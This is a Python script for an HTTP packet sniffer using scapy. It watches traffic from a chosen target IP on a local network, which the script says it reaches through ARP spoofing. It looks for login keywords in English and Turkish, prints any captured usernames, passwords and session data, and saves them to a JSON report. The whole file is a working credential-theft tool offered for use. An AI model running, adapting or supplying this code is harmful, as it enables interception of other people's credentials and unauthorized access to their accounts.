import argparse
from termcolor import colored
import sys
import os
import json

try:
    import scapy.all as scapy
except KeyboardInterrupt:
    print(colored("\n[-] CTRL+C pressed... Please wait...", "red"))
    print(colored("[-] Exiting the application!", "red"))
    sys.exit()

class Sniffer():
    def __init__(self):
        self.results = []
        self.about()
        self.script_desc()

    def save_results(self, result, file_path='report/exploit.json'):
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []

        data.append(result)

        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

    def arguman_al(self):
        parser = argparse.ArgumentParser(description=self.description, epilog=self.kullanim, prog=self.program, formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("--interface", dest="interface", help="Select interface")
        parser.add_argument("--target", dest="target", help="Target IP address")
        options = parser.parse_args()
        if not options.interface:
            parser.error('[-] Please specify an interface, use --help for more info.')
        elif not options.target:
            parser.error('[-] Please specify a target IP address, use --help for more info.')
        else:
            return options

    def sniff(self, interface, target):
        scapy.sniff(iface=interface, store=False, prn=lambda x: self.process_sniffed_packet(x, target))

    def get_login_info(self, packet):
        if packet.haslayer(scapy.Raw):
            try:
                load = packet[scapy.Raw].load.decode("utf-8")
                keywords = ["username", "user", "pass", "password", "sifre", "ad", "login", "kullanici", "kullaniciadi", "kullaniciAdi", "parola", "session_key", "session_password", "log", "pwd"]
                for keyword in keywords:
                    if keyword in load:
                        return load
            except UnicodeDecodeError:
                pass

    def process_sniffed_packet(self, packet, target):
        if packet.haslayer(scapy.IP) and packet[scapy.IP].src == target:
            if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                    if "POST" in load or "GET" in load:
                        print("[+] HTTP Request >> " + load)
                        login_info = self.get_login_info(packet)
                        if login_info:
                            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")
                            # Enregistrer le r√©sultat
                            result = {
                                "attack": "Packet sniffing",
                                "target": target,
                                "interface": options.interface,
                                "http_request": load,
                                "login_info": login_info
                            }
                            self.results.append(result)

    def script_desc(self):
        self.program = "packet_sniffer"
        self.kullanim = """Usage: python packet_sniffer.py --interface INTERFACE --target TARGET\nExample: python packet_sniffer.py --interface eth0 --target 192.168.1.10"""
        self.description = "This script listens to HTTP requests and captures possible username/password information when performing an ARP spoof on a target machine."

    def about(self):
        print(colored(" ____            _        _     ____        _  __  __           ", "green"))
        print(colored("|  _ \\ __ _  ___| | _____| |_  / ___| _ __ (_)/ _|/ _| ___ _ __ ", "green"))
        print(colored("| |_) / _` |/ __| |/ / _ \\ __| \\___ \\| '_ \\| | |_| |_ / _ \\ '__|", "green"))
        print(colored("|  __/ (_| | (__|   <  __/ |_   ___) | | | | |  _|  _|  __/ |   ", "green"))
        print(colored("|_|   \\__,_|\\___|_|\\_\\___|\\__| |____/|_| |_|_|_| |_|  \\___|_|   ", "green"))
        print(colored("# BY          : ", "green") + "CBI")
        print(colored("# description : ", "green") + "This script listens to HTTP requests and captures possible username/password information when performing an ARP spoof on a target machine.")
        print(colored("# date        : ", "green") + "22.05.2024")
        print(colored("# ===============================================================================", "green"))

try:
    sniffer = Sniffer()
    options = sniffer.arguman_al()
    sniffer.sniff(options.interface, options.target)
except KeyboardInterrupt:
    sniffer.save_results(sniffer.results)
    print(colored("\n[-] CTRL+C pressed... Please wait...", "red"))
    print(colored("[-] Results saved to 'report/exploit.json'", "green"))
    print(colored("[-] Exiting the application!", "red"))
    sys.exit()
